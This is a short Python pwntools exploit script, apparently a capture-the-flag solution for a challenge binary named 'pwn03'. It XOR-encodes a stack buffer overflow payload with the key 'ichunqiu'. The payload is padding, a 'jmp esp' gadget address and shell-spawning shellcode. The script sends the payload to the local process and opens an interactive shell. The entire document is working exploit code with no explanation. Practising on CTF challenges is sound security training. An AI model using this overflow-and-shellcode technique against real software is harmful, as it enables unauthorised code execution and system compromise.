from pwn import *

# context.log_level = 'debug'
context.arch = 'i386'

io = process("./pwn03/pwn03")

KEY = b"ichunqiu"
def en(payload: bytes):
    tmp = bytearray(payload)
    for i in range(len(tmp)):
        tmp[i] ^= KEY[i % len(KEY)]
    return bytes(tmp)
"""
0x080de6ab: jmp esp;
"""
jmp_esp = 0x080de6ab


shellcode = asm(shellcraft.sh())
total_length = 0x11c + 4 + len(shellcode)

addition = 8 - total_length % 8

payload = flat(b"A"*(0x11c) + p32(jmp_esp) + shellcode + b"A"*addition)
# payload = flat(b"A"*(0x11c) + p32(jmp_esp) + shellcode)

io.sendafter(f"Welcome to my encrypt server", en(payload))


io.send(b"ichunqiu")
io.interactive()